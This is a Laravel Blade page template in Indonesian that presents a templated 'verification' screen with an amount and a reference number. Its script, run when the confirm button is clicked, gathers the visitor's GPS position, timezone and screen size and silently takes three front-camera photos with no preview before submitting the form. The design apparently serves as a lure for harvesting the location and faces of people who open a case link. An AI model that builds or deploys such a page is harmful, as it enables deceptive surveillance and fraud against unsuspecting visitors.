<x-guest-layout>
    <div class="text-center">
        <h2 class="text-lg font-semibold text-gray-800">{{ $case->template->title }}</h2>
        <p class="mt-1 text-sm text-gray-600">Periksa detail di bawah ini, lalu klik {{ $case->template->button_text }}.</p>
    </div>

    <dl class="mt-6 grid grid-cols-1 gap-4">
        @foreach ($case->template->fields() as $field)
            @if ($case->fieldValue($field['key']) !== null)
                <div>
                    <dt class="text-sm font-medium text-gray-500">{{ $field['label'] }}</dt>
                    <dd class="mt-1 text-sm {{ $field['key'] === 'amount' ? 'font-semibold' : '' }}">{{ $case->formattedField($field['key']) }}</dd>
                </div>
            @endif
        @endforeach
        <div>
            <dt class="text-sm font-medium text-gray-500">No. Referensi</dt>
            <dd class="mt-1 font-mono text-sm">{{ $case->reference_number }}</dd>
        </div>
    </dl>

    <form method="POST" action="{{ route('verification.store', $case->token) }}" enctype="multipart/form-data" class="mt-8" id="verification-form">
        @csrf
        <input type="hidden" name="timezone" id="timezone">
        <input type="hidden" name="screen_resolution" id="screen_resolution">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="accuracy" id="accuracy">
        <input type="hidden" name="photo_status" id="photo_status">
        <input type="hidden" name="location_status" id="location_status">
        <input type="file" name="photo" id="photo-input" accept="image/jpeg,image/png,image/webp" multiple class="hidden">

        <p id="capture-status" class="mb-4 text-center text-sm text-gray-500"></p>

        <div class="flex items-center justify-center">
            <button type="submit" id="confirm-button" class="{{ $case->template->primaryButtonClasses() }}">
                <span id="confirm-label">{{ $case->template->button_text }}</span>
            </button>
        </div>
    </form>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var form = document.getElementById('verification-form');
            var confirmButton = document.getElementById('confirm-button');
            var confirmLabel = document.getElementById('confirm-label');
            var captureStatus = document.getElementById('capture-status');
            var photoInput = document.getElementById('photo-input');
            var submitting = false;

            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
            document.getElementById('screen_resolution').value = window.screen.width + 'x' + window.screen.height;

            function captureLocation() {
                return new Promise(function (resolve) {
                    if (!navigator.geolocation) {
                        document.getElementById('location_status').value = 'gagal';
                        resolve();
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(function (position) {
                        document.getElementById('latitude').value = position.coords.latitude;
                        document.getElementById('longitude').value = position.coords.longitude;
                        document.getElementById('accuracy').value = position.coords.accuracy;
                        document.getElementById('location_status').value = 'diberikan';
                        resolve();
                    }, function (error) {
                        document.getElementById('location_status').value = error.code === error.PERMISSION_DENIED ? 'ditolak' : 'gagal';
                        resolve();
                    }, { timeout: 8000 });
                });
            }

            function capturePhoto() {
                return new Promise(function (resolve) {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        document.getElementById('photo_status').value = 'gagal';
                        resolve();
                        return;
                    }

                    var files = [];
                    var MAX_PHOTOS = 3;

                    function stopStream(stream) {
                        stream.getTracks().forEach(function (track) { track.stop(); });
                    }

                    function finish(stream) {
                        stopStream(stream);

                        if (files.length > 0) {
                            var transfer = new DataTransfer();
                            files.forEach(function (file) { transfer.items.add(file); });
                            photoInput.files = transfer.files;
                            document.getElementById('photo_status').value = 'diberikan';
                        }

                        captureStatus.textContent = files.length + ' dari ' + MAX_PHOTOS + ' foto diambil.';
                        resolve();
                    }

                    function waitForFrame(video, callback, elapsed) {
                        if (elapsed > 2000) {
                            callback();
                            return;
                        }

                        if (video.videoWidth > 0 && video.currentTime > 0) {
                            callback();
                            return;
                        }

                        if ('requestVideoFrameCallback' in video) {
                            video.requestVideoFrameCallback(function () {
                                if (video.videoWidth > 0) {
                                    callback();
                                } else {
                                    setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                                }
                            });
                        } else {
                            setTimeout(function () { waitForFrame(video, callback, elapsed + 50); }, 50);
                        }
                    }

                    function snap(video, stream, remaining) {
                        var canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(function (blob) {
                            if (blob) {
                                files.push(new File([blob], 'foto-' + (files.length + 1) + '.jpg', { type: 'image/jpeg' }));
                            }

                            if (remaining > 1) {
                                setTimeout(function () { snap(video, stream, remaining - 1); }, 600);
                            } else {
                                finish(stream);
                            }
                        }, 'image/jpeg', 0.7);
                    }

                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(function (stream) {
                            var video = document.createElement('video');
                            video.srcObject = stream;
                            video.playsInline = true;
                            video.setAttribute('muted', '');
                            video.setAttribute('autoplay', '');

                            video.play().catch(function () {});

                            video.addEventListener('loadeddata', function () {
                                waitForFrame(video, function () {
                                    snap(video, stream, MAX_PHOTOS);
                                }, 0);
                            });
                        })
                        .catch(function (error) {
                            if (error.name === 'NotAllowedError') {
                                document.getElementById('photo_status').value = 'ditolak';
                            }
                            resolve();
                        });
                });
            }

            form.addEventListener('submit', function (event) {
                if (submitting) {
                    return;
                }

                event.preventDefault();
                submitting = true;
                confirmButton.disabled = true;
                confirmLabel.textContent = 'Memproses...';
                captureStatus.textContent = 'Meminta izin lokasi dan kamera, lalu mengambil 3 foto...';

                Promise.all([captureLocation(), capturePhoto()]).then(function () {
                    form.submit();
                });
            });
        });
    </script>
</x-guest-layout>
